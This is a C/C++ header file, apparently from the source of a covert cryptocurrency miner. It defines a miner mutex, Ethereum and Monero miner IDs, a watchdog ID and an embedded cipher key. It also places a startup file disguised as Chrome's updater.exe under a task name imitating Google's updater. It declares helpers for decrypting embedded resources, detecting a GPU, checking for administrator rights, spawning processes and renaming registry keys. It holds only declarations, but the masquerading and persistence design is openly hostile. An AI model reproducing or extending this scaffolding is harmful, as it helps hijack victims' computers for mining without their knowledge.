#pragma once

#include "ntddk.h"
#include <string>

#define MAX_DLL_FILES 50

#ifndef CIPHERKEY
#define CIPHERKEY "012345678901234567890123456789ab"
#endif

#ifndef LMUTEXMINER
#define LMUTEXMINER L"\\BaseNamedObjects\\#MUTEXMINER"
#endif

#ifndef LWATCHDOGID
#define LWATCHDOGID L"WATCHDOGID"
#endif

#ifndef LSTARTUPFILE
#define LSTARTUPFILE L"\\Google\\Chrome\\updater.exe"
#endif


#ifndef LSTARTUPENTRYNAME
#define LSTARTUPENTRYNAME L"GoogleUpdateTaskMachineQC"
#endif

#ifndef LMinerETHID
#define LMinerETHID L"MinerETHID"
#endif

#ifndef LMinerXMRID
#define LMinerXMRID L"MinerXMRID"
#endif

int GetDllFilesInDirectory(const wchar_t* folderPath, wchar_t dllFiles[MAX_DLL_FILES][MAX_PATH]);

std::wstring GetFileDirectory(wchar_t* filePath_t);

UNICODE_STRING init_unicode_string(wchar_t* source_string);

PROCESS_INFORMATION create_new_process_internal(LPWSTR programPath, LPWSTR cmdLine, LPWSTR startDir, LPWSTR runtimeData,
                                                DWORD processFlags, DWORD threadFlags);

bool has_gpu();

void run_program(bool wait,wchar_t* startDir, wchar_t* programPath, wchar_t* cmdLine, ...);

unsigned char* resource_decrypt(unsigned char* data, size_t in_len, size_t* out_len);

void resource_free(void* ptr, size_t size);

void cipher(unsigned char* data, SIZE_T datalen);

void write_resource(unsigned char* resource_data, ULONG datalen, wchar_t* base_path, wchar_t* file);

bool check_mutex(wchar_t* mutex);

void combine_path(wchar_t* src, wchar_t* base_path, wchar_t* ext_path);

void combine_pathA(char* src,const char* base_path,const char* ext_path);

wchar_t* get_env(wchar_t* env, wchar_t* env_name);

char* get_envA(char* env, char* env_name);

std::string getEnvironmentVariable(const char *varName);

bool install_check(wchar_t* imagePath);

void create_recursive_directory(wchar_t* dir_path);

PVOID read_file(wchar_t* file_path, ULONG* outFileSize);

void write_file(wchar_t* file_path, PVOID paylad_buf, ULONG payload_size);

void delete_file(wchar_t* file_path);

bool check_administrator();

void rename_key_registry(wchar_t* current_key, wchar_t* new_key);
